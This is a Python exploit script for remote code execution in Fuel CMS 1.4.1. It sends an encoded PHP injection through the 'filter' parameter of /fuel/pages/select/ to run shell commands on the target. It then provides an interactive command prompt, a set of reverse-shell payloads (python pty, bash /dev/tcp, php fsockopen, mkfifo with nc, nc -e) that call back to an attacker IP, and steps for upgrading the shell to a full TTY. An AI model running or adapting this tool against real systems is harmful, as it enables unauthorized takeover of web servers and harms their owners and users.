#!/usr/bin/python3

import requests
from urllib.parse import quote
import argparse
import sys
import os
import socket
import time


# ANSI Color codes for Linux terminals
class Colors:
    YELLOW = "\033[93m"
    GREEN = "\033[92m"
    RED = "\033[91m"
    CYAN = "\033[96m"
    RESET = "\033[0m"


class FuelCMSExploit:
    def __init__(self, url, attacker_ip=None, attacker_port=None):
        self.url = url
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.current_dir = "/var/www/html"  # Default web directory

    def execute_command(self, cmd):
        try:
            # Use absolute path if command starts with 'cd'
            if cmd.strip().startswith("cd "):
                new_dir = cmd.strip()[3:]
                if new_dir.startswith("/"):
                    self.current_dir = new_dir
                else:
                    self.current_dir = os.path.normpath(
                        os.path.join(self.current_dir, new_dir)
                    )
                return f"Changed directory to {self.current_dir}"

            # Prepend current directory to command context
            full_cmd = f"cd {self.current_dir} && {cmd}"

            main_url = (
                self.url
                + "/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"
                + quote(full_cmd)
                + "%27%29%2b%27"
            )

            r = requests.get(main_url)
            output = r.text.split(
                '<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">'
            )[0]
            return output.strip()

        except requests.RequestException as e:
            return f"Error executing command: {str(e)}"
        except Exception as e:
            return f"Unexpected error: {str(e)}"

    def get_reverse_shell_command(self):
        """Generate various reverse shell payloads"""
        shells = [
            # Upgraded shells with python PTY
            f'python -c \'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.attacker_ip}",{self.attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'',
            f'python3 -c \'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.attacker_ip}",{self.attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'',
            # Standard reverse shells
            f"bash -i >& /dev/tcp/{self.attacker_ip}/{self.attacker_port} 0>&1",
            f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.attacker_ip}",{self.attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
            f'php -r \'$sock=fsockopen("{self.attacker_ip}",{self.attacker_port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.attacker_ip} {self.attacker_port} >/tmp/f",
            f"nc {self.attacker_ip} {self.attacker_port} -e /bin/bash",
        ]
        return shells

    def show_shell_upgrade(self):
        """Show instructions for upgrading a reverse shell to fully interactive"""
        print(
            f"{Colors.CYAN}[*] Once you get a reverse shell, run these commands to make it fully interactive:{Colors.RESET}"
        )
        print(f"{Colors.GREEN}")
        print("1. On the reverse shell:")
        print("   python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
        print("   # Or if python3 isn't available:")
        print("   python -c 'import pty;pty.spawn(\"/bin/bash\")'")
        print("\n2. Press Ctrl+Z to background the shell")
        print("\n3. On your local terminal:")
        print("   stty raw -echo; fg")
        print("   # Press Enter twice")
        print("\n4. In the reverse shell:")
        print("   export TERM=xterm")
        print("   stty rows 38 columns 116")
        print(f"{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] You should now have a fully interactive shell with:")
        print("   - Tab completion")
        print("   - Arrow keys")
        print("   - Ctrl+C working")
        print(f"   - Commands like 'su' and 'nano' working properly{Colors.RESET}")

    def attempt_reverse_shell(self):
        """Try different reverse shell payloads"""
        print(
            f"{Colors.YELLOW}[*] Attempting to establish reverse shell...{Colors.RESET}"
        )
        print(
            f"{Colors.CYAN}[*] Make sure you have a listener running on {self.attacker_ip}:{self.attacker_port}{Colors.RESET}"
        )
        time.sleep(2)

        for shell in self.get_reverse_shell_command():
            print(f"{Colors.YELLOW}[*] Trying payload: {shell}{Colors.RESET}")
            self.execute_command(shell)
            time.sleep(2)

    def interactive_shell(self):
        print(
            f"{Colors.GREEN}[+] Interactive shell started. Type 'exit' to quit.{Colors.RESET}"
        )
        print(
            f"{Colors.GREEN}[+] Type 'shell' to attempt automatic reverse shell.{Colors.RESET}"
        )
        print(
            f"{Colors.GREEN}[+] Type 'upgrade' to see shell upgrade instructions.{Colors.RESET}"
        )
        print(f"{Colors.GREEN}[+] Current directory: {self.current_dir}{Colors.RESET}")

        while True:
            try:
                cmd = input(
                    f"{Colors.YELLOW}fuel-cms({self.current_dir})$ {Colors.RESET}"
                ).strip()

                if cmd == "exit":
                    break
                elif cmd == "shell":
                    if self.attacker_ip and self.attacker_port:
                        self.attempt_reverse_shell()
                    else:
                        print(
                            f"{Colors.RED}[!] Attacker IP and port not set. Use: shell_config <IP> <PORT>{Colors.RESET}"
                        )
                elif cmd == "upgrade":
                    self.show_shell_upgrade()
                elif cmd.startswith("shell_config "):
                    try:
                        _, ip, port = cmd.split()
                        self.attacker_ip = ip
                        self.attacker_port = int(port)
                        print(
                            f"{Colors.GREEN}[+] Reverse shell config set to {ip}:{port}{Colors.RESET}"
                        )
                    except ValueError:
                        print(
                            f"{Colors.RED}[!] Usage: shell_config <IP> <PORT>{Colors.RESET}"
                        )
                elif cmd:
                    output = self.execute_command(cmd)
                    if output:
                        print(output)

            except KeyboardInterrupt:
                print("\nUse 'exit' to quit")
                continue
            except EOFError:
                break


def get_user_input():
    """Get target and attacker information interactively"""
    print(f"{Colors.CYAN}╔════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}║     Fuel CMS 1.4.1 - RCE Exploit      ║{Colors.RESET}")
    print(f"{Colors.CYAN}╚════════════════════════════════════════╝{Colors.RESET}")

    while True:
        url = input(
            f"\n{Colors.YELLOW}[?] Enter target URL (e.g., http://10.10.10.10): {Colors.RESET}"
        ).strip()
        if url:
            if not url.startswith(("http://", "https://")):
                url = "http://" + url
            try:
                print(f"\n{Colors.YELLOW}[*] Testing connection to {url}{Colors.RESET}")
                r = requests.get(url)
                if r.status_code == 200:
                    print(
                        f"{Colors.GREEN}[+] Successfully connected to target{Colors.RESET}"
                    )
                    break
            except requests.ConnectionError:
                print(
                    f"{Colors.RED}[!] Cannot connect to target URL. Try again.{Colors.RESET}"
                )
                continue

    while True:
        attacker_ip = input(
            f"\n{Colors.YELLOW}[?] Enter your IP for reverse shell: {Colors.RESET}"
        ).strip()
        if attacker_ip:
            try:
                # Basic IP validation
                socket.inet_aton(attacker_ip)
                break
            except socket.error:
                print(f"{Colors.RED}[!] Invalid IP address. Try again.{Colors.RESET}")

    while True:
        try:
            attacker_port = input(
                f"\n{Colors.YELLOW}[?] Enter your port for reverse shell (default: 4444): {Colors.RESET}"
            ).strip()
            if not attacker_port:
                attacker_port = "4444"
            port = int(attacker_port)
            if 1 <= port <= 65535:
                break
            else:
                print(
                    f"{Colors.RED}[!] Port must be between 1 and 65535. Try again.{Colors.RESET}"
                )
        except ValueError:
            print(f"{Colors.RED}[!] Invalid port number. Try again.{Colors.RESET}")

    print(f"\n{Colors.GREEN}[+] Configuration:{Colors.RESET}")
    print(f"{Colors.GREEN}    Target URL: {url}{Colors.RESET}")
    print(f"{Colors.GREEN}    Your IP: {attacker_ip}{Colors.RESET}")
    print(f"{Colors.GREEN}    Your Port: {port}{Colors.RESET}")

    return url, attacker_ip, port


def main():
    try:
        banner = """
███████╗██╗   ██╗███████╗██╗         ██████╗███╗   ███╗███████╗
██╔════╝██║   ██║██╔════╝██║        ██╔════╝████╗ ████║██╔════╝
█████╗  ██║   ██║█████╗  ██║        ██║     ██╔████╔██║███████╗
██╔══╝  ██║   ██║██╔══╝  ██║        ██║     ██║╚██╔╝██║╚════██║
██║     ╚██████╔╝███████╗███████╗    ╚██████╗██║ ╚═╝ ██║███████║
╚═╝      ╚═════╝ ╚══════╝╚══════╝     ╚═════╝╚═╝     ╚═╝╚══════╝
        """
        print(f"{Colors.CYAN}{banner}{Colors.RESET}")
        url, attacker_ip, attacker_port = get_user_input()

        exploit = FuelCMSExploit(url, attacker_ip, attacker_port)

        print(f"\n{Colors.YELLOW}[*] Starting interactive shell...{Colors.RESET}")
        print(
            f"{Colors.YELLOW}[*] Pro tip: Type 'upgrade' after getting a reverse shell to make it fully interactive!{Colors.RESET}\n"
        )

        exploit.interactive_shell()

    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Exiting...{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[!] An error occurred: {str(e)}{Colors.RESET}")
        sys.exit(1)


if __name__ == "__main__":
    main()
